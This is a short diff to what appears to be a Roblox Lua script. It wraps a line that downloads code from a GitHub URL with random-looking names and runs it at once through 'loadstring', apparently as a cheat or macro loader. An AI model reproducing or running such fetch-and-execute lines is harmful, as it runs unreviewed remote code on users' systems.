@@ -1,5 +1,7 @@
 wait(50)
+task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/SET_5FPSp"))()	
+end)
 PAUSE_or_SEND = "p"
 
 wait(1)
